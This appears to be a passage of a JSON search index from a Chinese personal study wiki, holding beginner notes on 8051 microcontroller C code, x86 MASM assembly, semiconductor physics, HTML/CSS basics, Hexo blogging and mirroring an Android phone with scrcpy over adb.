汇编语言：movsb/w/d","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"hexo联动Typora","date":"2020-05-13T10:40:49.000Z","path":"wiki/折腾笔记/博客搭建/hexo联动Typora/","text":"hexo联动Typora 插入图片使用Typora这款软件来写作hexo博客的时候，经常遇到了一个烦人的问题，那就是插入图片的时候，hexo要用的图片路径和Typora写作用的图片路径不一样 有两条思路来解决这个问题 将hexo和Typora存放图片的路径设置为相同的 改变hexo或者Typora读取图片的路径 第一种方法网上很好搜到，就不说了，这里谈谈第二种方法 我这里hexo设置了，hexo-post-asset，好像是这个名字，反正就是图片会从同文章名文件夹里读取 在每个文件的YAML里添加如下行： 1typora-root-url: 装图片的文件夹名 然后文章内插入图片,例如： 1234可行：![image-20200513185515393](image-20200513185515393.png)不可行:![image-20200513185515393](/image-20200513185515393.png) 如图： 这样图片既可以在hexo直接显示，也可以在typora编辑器上看到","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"51单片机入门03--按键","date":"2020-05-13T05:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门03--按键/","text":"51单片机入门03–按键键盘的原理 按键需要一个上拉电阻，当没有按下去的时候，由于上拉电阻，左边的端口是高电平，当按键闭合后，左边的端口会变成低电平 这里按下的瞬间存在一个电平抖动的问题，所以需要消除抖动： 硬件消抖：锁存器 软件消抖：延时程序 分类分为两类： 独立式键盘 每个按键占用一根并口线 用于键位较少的情况，处理简单 矩阵键盘 键位分布在行列交叉点上 占用并口少，键位越多越明显 后面将以示例介绍两种键盘 键位的识别对于独立式键盘：直接识别对应并口即可 对于矩阵键盘： 先检测键盘上是否有键被按下 然后识别按下的是哪一个按键 示例：每次按下按键试数码管数字加一（独立键盘）原理图： P1~P3自带上拉电阻，P0需要自己加上拉电阻 代码： 1234567891011121314151617181920212223242526272829#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;sbit key0=P0^0;unsigned char num=0;flag=0;//程序消抖void key()&#123; if(key0==0&amp;&amp;flag==0)&#123; //判断按键是否按下 flag=1; &#125; if(key0==1&amp;&amp;flag==1)&#123; //判断按键是否从按下状态中弹起，如果是，则实现功能 num++; flag=0; &#125;&#125;void seg()&#123; if(num&gt;9)num=0; P2 = s[num];&#125;void main()&#123; while(1)&#123; key(); seg(); &#125;&#125; 示例：按下不同的按键显示不同的数字（矩阵键盘）原理图： 如何判断按下的按键是哪个按键？ 123456L3 L2 L1 L0 H3 H2 H1 H0 hex0 0 0 0 1 1 1 1 0x0f 默认情况0 0 0 0 1 1 1 0 0x0e 判断按下按键的行，H01 1 1 1 0 0 0 0 0xf0 默认情况取反1 1 0 1 0 0 0 0 0xd0 判断按下按键的列，L1将第二行和第四行的值相加：0xde 即为(H0,L1)按键在P2中的值 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;unsigned char num=99;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void key_scan()&#123; unsigned char tmp=0,tmp0=0,tmp1=0; //判断按下去的按键 P1=0x0f; if(P1!=0x0f)&#123; delay(20);//还是这样消除抖动最方便 tmp0 = P1; P1=0xf0; if(P1!=0xf0) tmp1 = P1; &#125; tmp = tmp1+tmp0; //实现功能 if (tmp == 0xee)num=0; //display 0 if (tmp == 0xde)num=1; //display 1&#125;void display()&#123; P2=s[num];&#125;void main()&#123; while(1)&#123; key_scan(); display(); &#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"王道计组笔记01--计算机系统概述","date":"2020-05-13T02:17:33.000Z","path":"wiki/学习笔记/王道计组书学习笔记/王道计组笔记01--计算机系统概述/","text":"王道计组笔记01–计算机系统概述","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"王道计组书学习笔记","slug":"学习笔记/王道计组书学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%8B%E9%81%93%E8%AE%A1%E7%BB%84%E4%B9%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门02--数码管","date":"2020-05-12T09:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门02--数码管/","text":"51单片机入门02–数码管实验环境 Protues Keil 数码管结构和原理原理图： 不同字符对应16进制断码为： 数码管的显示方式显示方式分为静态显示和动态显示，其中： 静态显示 每个数码管的段选线与一组I/O接口线连接 每个数码管一直显示 公共端接地或电源 动态显示 所有数码管的段选线与一组I/O接口线并联 每个数码管的公共端由一根I/O线控制 显示为逐个显示 只显示一位的话，那就不做区分了，因为都一样 示例1：循环显示0~9（静态显示）电路图及源码 代码如下：通过数组来控制依次显示的字符 1234567891011121314151617181920212223#include \"reg51.h\"unsigned char s[]=&#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;10;i++)&#123; P2 = s[i]; delay(1000); &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125; 示例2：用多位数码管显示selph字样（动态显示）电路图&amp;效果图如下： 代码如下：通过一个数组来定义显示的字符，另一个数组来定义显示的顺序，从而实现动态显示 123456789101112131415161718192021222324252627#include \"reg51.h\"unsigned char anode[]=&#123;0x92,0x86,0xc7,0x8c,0x89&#125;;//SELPHunsigned char nu[]=&#123;0x01,0x02,0x04,0x08,0x10&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;5;i++)&#123; P3 = nu[i];//P2和P3的顺序不能反，不然残留的内容会出问题 P2 = anode[i]; delay(10);//利用视觉残留产生同时显示多位不同的字符的效果 &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125; 简化版电路图&amp;效果图： 这里使用74LS137译码器(74LS138也可以)进行译码操作（功能表及使用方法自行百度），通过P3.1-P3.3 的3个端口来表示全部8位的内容，有效节约了单片机的端口使用。 这里使用的是共阴的数码管，如果使用共阳则需要在译码器的8个输出端口加一个反相器 代码实现： 123456789101112131415161718192021222324252627#include \"reg51.h\"unsigned char cathode[]=&#123;0x6d,0x79,0x38,0x73,0x76&#125;;unsigned char ym[]=&#123;0x00,0x01,0x02,0x03,0x04&#125;;void delay(int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void seg()&#123; int i=0; for(i=0;i&lt;5;i++)&#123; P3 = ym[i]; P2 = cathode[i]; delay(5); &#125;&#125;void main()&#123; while(1)&#123; seg(); &#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"半导体物理01--能带理论","date":"2020-04-26T14:37:19.000Z","path":"wiki/学习笔记/半导体物理学习笔记/半导体物理01--能带理论/","text":"半导体物理01 – 能带理论认识半导体半导体的主要特征：电阻率可在很大范围内变化 半导体的分类： 元素半导体（单质，比如Si、Ge） 化合物半导体（比如：GaAs、InP） 固溶半导体（混合晶体） 非晶态半导体 有机半导体 半导体的晶格结构： 金刚石结构（共价键 | Si、Ge） 闪锌矿结构（混合键） 纤锌矿结构（混合键） NaCl结构（共价键） 能带理论原子中的电子状态–能级电子运动处于量子态，要完全描述电子的运动需要4个量子数（唯一确定）： 主量子数n（主能级）：表征量子态具有的能量大小，n=1,2,3… 角量子数l（次能级）：表征电子运动的角动量大小， l=0,1,2,3… 磁量子数m：决定轨道角动量在空间的方位，m=0,±1,±2… 自旋量子数s：决定自旋角动量在空间的方位，s=±1/2 主能级n的值决定有多少次能级l 次能级轨道依次为s p d f 磁量子数m和次能级轨道数有关，后面的轨道比前面的轨道m多2 自旋量子数说明电子有两种自旋方向 简并度：指量子态数（由对应能级的磁量子数决定） 电子在量子态上的分布电子填充量子态需遵从2个原则： 泡利不相容原理（计入自旋）：原子中每个量子态最多只能容纳一个电子 能量最低原理：原子中的电子，在不违背泡利不相容原理的前提下，总是先占据能量低的量子态 晶体中的电子状态–能带电子共有化运动： 原子靠近组成晶体，越外层的层壳交叠越多 电子不再局限于某一原子，可以转移到相邻原子上 电子的转移只能在不同原子的相似壳层 电子共有化运动 —&gt; 分裂出若干个相近的能级 —&gt; 形成一个准连续的能带 能带重组： 绝对零度时（0K），半导体、绝缘体、金属的能带区别半导体，绝缘体，金属能带的区别： 绝缘体：导带是空带，价带是满带，禁带距离大 半导体：导带是空带，价带是满带，禁带距离小 金 属：导带是半满，价带是满带，禁带距离无 电子从价带跃迁到导带，使晶体拥有导电特性 满带、空带：不导电 半满带：导电 绝缘体和半导体结构类似，在0K时不导电， 在室温环境下，由于本征激发，半导体有一定的导电性（掺杂之后可以强导电） 半导体中电子的状态和能带单电子近似：晶体中的电子是在晶格的周期性势场（原子核与电子的平均势场）中运动的 布洛赫定理：","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"半导体物理学习笔记","slug":"学习笔记/半导体物理学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础12--数组和结构体","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础12--数组和结构体/","text":"汇编基础12 – 数组和结构体数组的声明和使用： 1234567891011121314151617181920212223.586.MODEL flat ,stdcall.Datavalu dd 11,22,33;声明并初始化有三个元素的 DWORD 数组; 该数组每个元素是 4 字节;也可以按如下方式写;valu dd 11; dd 22,33.Codemain PROC mov eax,valu ;0x0B mov eax,valu[4] ;0x16 mov eax,valu[8] ;0x21; mov eax,valu[4*0] ;0x0B; mov eax,valu[4*1] ;0x16; mov eax,valu[4*2] ;0x21 mov [valu+4],5 mov ebx ,[valu+4] mov eax,eaxmain ENDPEND main 使用伪指令DUP： 123456789101112131415.586.MODEL flat ,stdcall.Datavalu dd 3 dup(0);用于初始化数组.Codemain PROC mov eax,valu mov eax,valu[4] mov eax,valu[8] mov eax,eaxmain ENDPEND main 参考资料 学 Win32 汇编6: 伪指令 DUP 与数组","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础11--win32汇编","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础11--win32汇编/","text":"汇编基础11 – win32汇编控制台程序的输入输出消息框API：（Application Programming Interface，应用程序接口）是一些预先定义的函数，或指软件系统不同组成部分衔接的约定。 [1] 目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问原码，或理解内部工作机制的细节。 win32汇编是通过使用Windows提供的接口进行编程 示例：hello world！ 123456789101112131415161718192021222324252627.586.MODEL flat,stdcallincludelib user32.libincludelib kernel32.lib;声明函数ExitProcess PROTO, dwExitCode:DWORDMessageBoxA PROTO, hWnd:DWORD ,lpText:BYTE ,lpCaption:BYTE ,uType:DWORD;参数从栈中调用出来，左边的参数在栈下面，右边的在上面.datastr1 db &quot;Hello world&quot; ,0;需要,0结尾，不然出错;db是一个占了8位的类型，db后面的内容视为数据而不视为代码.codemain proc push 1 lea eax ,str1 push eax push eax push 0 call MessageBoxA add esp ,16 ;堆栈平衡 invoke ExitProcess,0main ENDPEND main 最常用的一个工具是MASM32，网上搜索，下载，安装 找到目录下的include,和lib目录添加到配置里： 在vs2015里右键项目名称–属性： 链接器–常规–附加库目录 Microsoft Macro Assmble–General–include Path C的库函数输出用到的库：msvcrt 1234567891011include msvcrt.incincludelib msvcrt.lib.data text db &quot;hello world !&quot;,0.codemain proc push offset text call crt_printf add esp ,4main endpEND main 输入 1234567891011121314include msvcrt.incincludelib msvcrt.lib.data format db &quot;%s&quot;,0 text1 db 0.codemain proc push offset text1 push offset format call crt_scanf ;输入 call crt_printf add esp ,8main endpEND main 示例：输入两个数，输出两数之和12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455.586.model flat ,stdcalloption casemap:noneinclude kernel32.incinclude user32.incinclude msvcrt.incincludelib kernel32.libincludelib user32.libincludelib msvcrt.lib.data text db &quot;请输入两个数：&quot;,0dh,0ah,0 text1 db &quot;两个数的和为：&quot;,0 format db &quot;%s&quot;,0 format_num db &quot;%d&quot;,0 num1 db 0,0,0,0 num2 db 0,0,0,0.codemain proc push offset text call crt_printf add esp ,4 push offset num1 push offset format_num call crt_scanf add esp ,8 push offset num2 push offset format_num call crt_scanf add esp ,8 mov eax ,dword ptr num1 add eax ,dword ptr num2 push eax push offset format_num push offset text1 push offset format call crt_printf add esp ,8 call crt_printf add esp ,8 push 0 call ExitProcess add esp ,4main endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础10--使用函数","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础10--使用函数/","text":"汇编基础10 – 使用函数函数编写函数格式： 123function proc codefunction endp 传参方式： 寄存器 堆栈 函数调用调用指令：CALL 格式：CALL OPRD 相当于： 12push EIPjmp OPRD 返回指令：RETN 格式：RETN 相当于： 12pop EIPjmp EIP 函数调用会先push eip，跳转到函数进行调用，调用完后再pop eip 示例1：通过栈传递参数 123456789101112131415161718.586.MODEL flat,stdcall.codeaddx proc mov eax ,[esp+4] ;先进栈的，地址位置大，后进的，地址小（小端序） mov ebx ,[esp+8] add eax ,ebx retnaddx endpmain proc push 1 push 2;通过栈传参 call addx mov eax ,eaxmain ENDPEND main 示例2：通过寄存器传递参数 12345678910111213141516.586.MODEL flat,stdcall.codeaddx proc add eax ,ebx retnaddx endpmain proc mov eax ,2 mov ebx ,1 call addx mov eax ,eaxmain ENDPEND main 示例3：加减乘除函数 12345678910111213141516171819202122232425262728293031323334353637383940.586.MODEL flat,stdcall.codeaddx proc add eax ,ebx retnaddx endpsubt proc sub eax ,ebx retnsubt endpmult proc mov ebx,[esp+4] mul ebx retmult endpdivi proc div ebx mov ah,ah mov al,al retdivi endpmain proc mov eax ,2 mov ebx ,2 push 15 call addx call subt call mult mov ebx ,1;把ebx清0，方便观察看出栈数据 pop ebx call divi mov eax ,eaxmain ENDPEND main 示例4：使用寄存器作为参数 123456789101112131415161718addx proc uses esi ecx ;函数中使用寄存器（用完之后用的寄存器会回复原来的值） add esi ,ecx ;mov ecx ,22 mov eax ,esi ;这里需要把结果保存到其他寄存器里 retaddx endpmain proc mov esi ,5 mov ecx ,1 push esi push ecx call addx push 0 call ExitProcessmain endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础09--传送指令","date":"2020-04-17T23:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础09--传送指令/","text":"汇编基础09 – 传送指令指令：MOVS 格式：MOVS OPRD1,OPRD2 功能：把DS:SI指向的存储单元中的数据装入ES:DI指向的存储单元中，然后根据DF标志分别增减SI和DI 示例 1234567891011.586.MODEL flat,stdcall.codemain proc mov edi ,esp mov dword ptr ss:[esp],0;给edi清零 mov esi ,ebp movs dword ptr es:[edi],dword ptr ds:[esi];把esi中的数据存储到edi中 mov eax ,eaxmain ENDPEND main 寄存器存储的是内存地址，内存地址里存储的是数据 使用loop也可以实现一点内存中的数据传送： 12345678910111213141516.data sstr byte &quot;hello selph!&quot;,0 tstr byte sizeof sstr dup(0).codemain proc xor esi ,esi mov ecx ,sizeof sstrlp: mov al ,sstr[esi] mov tstr[esi] ,al inc esi loop lp push 0 call ExitProcessmain endpEND main 指令：STOS 格式：STOS OPRD 功能：把AL/AX/EAX/RAX等中的数据存储到DI/EDI（这种为目的串的地址）中，每次执行后，会根据DF的值进行自动调整 把AL或AX中的数据装入ES:DI指向的存储单元，然后根据DF标志增减DI 示例： 12345678910.586.MODEL flat,stdcall.codemain proc mov eax,11223344 mov edi ,esp stos dword ptr es:[edi] mov eax ,eaxmain ENDPEND main 将EAX的值放到目的地址中 指令：REP 格式：REP 功能：重复其后的字符串操作指令。重复前先判断CX是否为0，为0就结束重复，否则CX减1，重复其后的串操作指令。主要用在MOVS和STOS前。一般不用在LODS前。 示例： 12345678910111213.586.MODEL flat,stdcall.codemain proc mov ecx,4 mov edi ,esp mov dword ptr ss:[esp],0;给edi清零 mov esi ,ebp movs dword ptr es:[edi],dword ptr ds:[esi] rep movsb mov eax,eaxmain ENDPEND main 将esi的4个位传送到edi，每重复一次，往后多传送一位","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础08： JCC 转移指令","date":"2020-04-17T22:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础08--JCC指令/","text":"汇编基础08： JCC 转移指令常用的JCC指令 JMP：无条件跳转 JZ/JE：ZF =1,也就是比较结果=0[cmp通过相减的方式进行比较(相等)]时跳转 JNZ/JNE：ZF =0，也就是比较结果≠0（不相等）时跳转 JBE/JNA：CF=1/ZF=1 ，低于等于/不高于等于跳转(前面数小于等于后面数) JNBE/JA：CF=0/ZF=0 ，不低于等于/高于等于跳转（前面数大于等于后面数） JL/JNGE：SF!=OF ，小于/不大于等于跳转 JNL/JGE：SF=OF ,不小于/大于等于跳转 注意： 使用JCC指令的时候，前面不要跟影响标志位的指令 一般JCC和CMP指令一起用 JCC指令表","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"使用电脑控制手机","date":"2020-04-17T07:38:51.000Z","path":"wiki/折腾笔记/手机连接电脑/使用电脑控制手机/","text":"使用电脑控制 Android 手机scrcpy（适用Windows、Linux、MacOS）scrcpy 是免费开源的投屏软件，支持将安卓手机屏幕投放在 Windows、macOS、GNU/Linux 上，并可直接借助鼠标在投屏窗口中进行交互和录制。 项目地址：https://github.com/Genymobile/scrcpy Windows软件下载：https://github.com/Genymobile/scrcpy/releases/download/v1.12.1/scrcpy-win64-v1.12.1.zip Windows 下 有线连接 手机开启开发者模式 手机开启USB调试模式 手机和电脑通过数据线连接 双击软件中的scrcpy.exe 即可完成有线连接下的电脑控制手机（手机投屏电脑） Windows 下 无线连接1234567891011# a.将代码目录定位到 scrcpy 文件夹cd D:\\Libraries\\Desktop\\scrcpy-win64-v1.12.1# b.在手机端开启「开发者选项」及「USB 调试」，然后使用数据线将手机和电脑连接并允许 USB 调试，开启手机端口.\\adb tcpip 5555# c.拔出手机数据线，开始无线投屏。(192.168.2.234 为手机端 ip，需更改).\\adb connect 192.168.2.234:5555# d.启动 scrcpy.exe.\\scrcpy 参考资料 scrcpy - 手机无线投屏到电脑","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"手机连接电脑","slug":"折腾笔记/手机连接电脑","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/"}]},{"title":"test","date":"2020-04-14T09:40:50.000Z","path":"wiki/test/","text":"参考资料","tags":[],"categories":[]},{"title":"汇编基础07：比较指令","date":"2020-04-11T07:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础07--比较指令/","text":"汇编基础07：比较指令CMP 格式：CMP OPRD1,OPRD2 功能：对两个数进行相减，进行比较 作用：影响标志位 测试代码： 1234567891011121314.586.MODEL flat,stdcall.codemain proc mov eax ,5 mov ebx ,4 cmp eax ,ebx cmp eax ,5 cmp eax ,ebx cmp eax ,6 cmp eax ,ebx mov eax ,eaxmain ENDPEND main 结果： 当OPDR1 &gt; OPDR2 时：PL=0 ，ZR=0，AC=0，CY=0，PE=0 当OPDR1 = OPDR2 时：PL=0 ，ZR=1，AC=0，CY=0，PE=1 当OPDR1 &lt; OPDR2 时：PL=1 ，ZR=0，AC=1，CY=1，PE=1 TEST 格式：TEST OPRD1,OPRD2 功能：与AND相同，但结果直接抛弃，对标志位进行重新置位","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"前端入门01--HTML和CSS基础","date":"2020-04-06T17:17:33.000Z","path":"wiki/学习笔记/前端入门学习笔记/前端入门01--HTML&CSS基础/","text":"前端入门 01 – HTML和CSS基础环境准备编辑器： VS Code 插件： City Lights Theme Live Server prettier vim HTML 最基础的结构123456&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 引用 CSS 样式有三种方式引用CSS： 内部引用，CSS比较少时，写在一个文件中看起来方便，或者用在复杂的覆盖层级 1&lt;style&gt;&lt;/style&gt; 外部引用，写在单独一个文件时比较方便，使用在CSS较多时，或者用他人CSS时 1&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./style.css\"&gt; 内联样式，作为元素的style属性，常用于覆盖其他样式 123&lt;div style=\"width:50px;\" class=\"red\"&gt; hello world&lt;/div&gt; 内部引用样式优先级顺序取决于写在style标签里的先后顺序，写在后面的会覆盖写在前面的样式 三种样式引用优先级顺序为：内联样式 &gt; 内部样式 &gt; 外部样式 样式选择器 id选择器：选取id属性，例如：#red 类选择器：选取class属性，例如：.red 类型选择器：选取元素类型，例如：div CSS 基本写法基本格式：选择器 + {属性;} 1234.red &#123; background-color:red; width:50px;&#125; 属性名称中带有- 的为子属性 让元素横着排列：向CSS中添加flex属性 1display:flex 改变元素轴向分布：使用justify-content属性 12居中对齐justify-content:center 加边框：使用border属性 12border-width:10px;border-style:solid; 使用flex居中： 123display: flex;justify-content: center;align-items: center; 盒模型待补充","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"前端入门学习笔记","slug":"学习笔记/前端入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门01--LED流水灯","date":"2020-04-04T15:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门01--LED流水灯/","text":"51单片机入门01–LED流水灯实验环境 Protues Keil 电路图 能流过LED的电流大概是20mA，所以需要加大于250Ω的电阻 仿真软件单片机内部自带复位和时钟电路 代码延时程序：通过空执行循环来达到延时的效果，120次大概是1ms 123456void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;&lt;j++); &#125;&#125; LED流水灯程序：通过移位来实现流水灯功能 1234567891011121314151617void led1()&#123; int i=0; for(i=0;i&lt;9;i++)&#123; P2=~(0x01&lt;&lt;i);//0000 0001 --&gt; 0000 0010 --&gt; 0000 0100 delay(200); &#125;&#125;void led2()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P1=0x01&lt;&lt;i; delay(200); &#125; P1 = 0x00;&#125; led1函数为共阳的8个led进行流水灯操作 led2函数为共阴的8个led进行流水灯操作 led2函数执行完之后，P1.7端口依然处于高电平，此处用P1 = 0x00；来熄灭 完整代码： 12345678910111213141516171819202122232425262728293031323334353637#include\"reg51.h\"//头文件有两种写法，还有一种是通过&lt;reg51.h&gt;来导入，系统会从默认路径找头文件，通过“”是从用户定义路径查找，然后再去系统路径查找void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void led1()&#123; int i=0; for(i=0;i&lt;9;i++)&#123; P2=~(0x01&lt;&lt;i);//0000 0001 --&gt; 0000 0010 --&gt; 0000 0100 delay(200); &#125;&#125;void led2()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P1=0x01&lt;&lt;i; delay(200); &#125; P1 = 0x00;&#125;void main()&#123; P1 = 0x00; while(1)&#123; led1(); led2(); &#125;&#125; 主程序里，先将与P1连接的灯全部熄灭再进行16个led的流水灯操作比较好看 流水灯的通用实现方法 12345678910111213141516171819202122232425#include \"reg51.h\"unsigned char leddat[]=&#123;0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80&#125;;void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125; void led()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P2=~leddat[i]; delay(100); &#125;&#125;void main()&#123; while(1)&#123; led(); 